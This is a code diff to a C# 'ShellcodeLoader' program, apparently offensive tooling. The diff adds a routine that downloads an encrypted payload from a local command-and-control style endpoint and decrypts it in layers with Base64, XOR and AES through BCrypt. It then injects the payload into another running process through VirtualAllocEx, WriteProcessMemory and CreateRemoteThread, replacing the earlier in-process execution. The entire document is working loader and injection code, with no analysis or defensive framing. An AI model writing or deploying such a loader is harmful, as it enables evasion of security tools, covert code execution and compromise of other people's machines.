@@ -1,38 +1,62 @@
 ﻿using System;
 using System.Net;
 using System.Runtime.InteropServices;
+using System.Text;
 
 namespace ShellcodeLoader
 {
     public class Loader
     {
-        [DllImport("kernel32.dll")]
-        public static extern IntPtr VirtualAlloc(
-            IntPtr lpAddress,
-            uint dwSize,
-            AllocationType flAllocationType,
-            MemoryProtection flProtect);
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
+            uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
+            byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
 
         [DllImport("kernel32.dll")]
-        public static extern IntPtr CreateThread(
-            IntPtr lpThreadAttributes,
-            uint dwStackSize,
-            IntPtr lpStartAddress,
-            IntPtr lpParameter,
-            uint dwCreationFlags,
-            out IntPtr lpThreadId);
+        static extern IntPtr CreateRemoteThread(IntPtr hProcess,
+            IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
+            IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 
         [DllImport("kernel32.dll")]
-        public static extern bool VirtualProtect(
-            IntPtr lpAddress,
-            uint dwSize,
-            MemoryProtection flNewProtect,
-            out MemoryProtection lpflOldProtect);
+        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
 
         [DllImport("kernel32.dll")]
-        public static extern uint WaitForSingleObject(
-            IntPtr hHandle,
-            uint dwMilliseconds);
+        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
+
+        [DllImport("kernel32.dll")]
+        public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, MemoryProtection flNewProtect, out MemoryProtection lpflOldProtect);
+
+        [DllImport("kernel32.dll")]
+        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+        [DllImport("bcrypt.dll")]
+        public static extern uint BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId, [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation, uint dwFlags);
+
+        [DllImport("bcrypt.dll")]
+        public static extern uint BCryptSetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, uint cbInput, uint dwFlags);
+
+        [DllImport("bcrypt.dll")]
+        public static extern uint BCryptGenerateSymmetricKey(IntPtr hAlgorithm, out IntPtr phKey, IntPtr pbKeyObject, uint cbKeyObject, byte[] pbSecret, uint cbSecret, uint dwFlags);
+
+        [DllImport("bcrypt.dll")]
+        public static extern uint BCryptDecrypt(IntPtr hKey, byte[] pbInput, uint cbInput, IntPtr pPaddingInfo, byte[] pbIV, uint cbIV, byte[] pbOutput, uint cbOutput, out uint pcbResult, uint dwFlags);
+
+        // XOR decryption
+        private static byte[] XORDecrypt(byte[] data, byte[] key)
+        {
+            byte[] decrypted = new byte[data.Length];
+            for (int i = 0; i < data.Length; i++)
+            {
+                decrypted[i] = (byte)(data[i] ^ key[i % key.Length]);
+            }
+            return decrypted;
+        }
 
         [Flags]
         public enum AllocationType
@@ -64,7 +88,7 @@ namespace ShellcodeLoader
             WriteCombineModifierflag = 0x400
         }
 
-        static void Main(string[] args)
+        static byte[] getterShellcode()
         {
             byte[] shellcode;
 
@@ -74,7 +98,56 @@ namespace ShellcodeLoader
                 shellcode = client.DownloadData("http://127.0.0.1:8081/agents/windows/cs");
             }
 
-            // Allocate a region of memory in this process as RW
+            // Base64 decoding
+            shellcode = Convert.FromBase64String(Encoding.UTF8.GetString(shellcode));
+
+            // XOR decryption
+			var xorKey = Convert.FromBase64String("#1"); // XOR key
+            shellcode = XORDecrypt(shellcode, xorKey);
+
+            // AES decryption process
+            var hAlgorithm = IntPtr.Zero;
+            var ntStatus = BCryptOpenAlgorithmProvider(out hAlgorithm, "AES", null, 0);
+            if (ntStatus != 0)
+                throw new Exception("BCryptOpenAlgorithmProvider failed with status " + ntStatus);
+
+            var chainingMode = Encoding.Unicode.GetBytes("ChainingModeCBC\0");
+            ntStatus = BCryptSetProperty(hAlgorithm, "ChainingMode", chainingMode, (uint)chainingMode.Length, 0);
+            if (ntStatus != 0)
+                throw new Exception("BCryptSetProperty failed with status " + ntStatus);
+
+			var key = Convert.FromBase64String("#2"); // AES-256 key
+            var hKey = IntPtr.Zero;
+            ntStatus = BCryptGenerateSymmetricKey(hAlgorithm, out hKey, IntPtr.Zero, 0, key, (uint)key.Length, 0);
+            if (ntStatus != 0)
+                throw new Exception("BCryptGenerateSymmetricKey failed with status " + ntStatus);
+
+			var iv = Convert.FromBase64String("#3"); // AES IV
+            var decryptedShellcode = new byte[shellcode.Length];
+            uint decryptedShellcodeSize;
+            ntStatus = BCryptDecrypt(hKey, shellcode, (uint)shellcode.Length, IntPtr.Zero, iv, (uint)iv.Length, decryptedShellcode, (uint)shellcode.Length, out decryptedShellcodeSize, 0);
+            if (ntStatus != 0)
+                throw new Exception("BCryptDecrypt failed with status " + ntStatus);
+
+            shellcode = decryptedShellcode;
+
+            return shellcode;
+        }
+
+        static void Main(string[] args)
+        {
+
+            byte[] buf = getterShellcode();
+
+            IntPtr hProcess = OpenProcess(0x001F0FFF, false, 4060);
+
+            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
+
+            IntPtr outSize;
+            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
+
+            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+            /*// Allocate a region of memory in this process as RW
             var baseAddress = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ReadWrite);
 
             // Copy the shellcode into the memory region
@@ -90,7 +163,8 @@ namespace ShellcodeLoader
 
 
             // Wait infinitely on this thread to stop the process exiting
-            WaitForSingleObject(hThread, 0xFFFFFFFF);
+            WaitForSingleObject(hThread, 0xFFFFFFFF);*/
+
         }
     }
 }
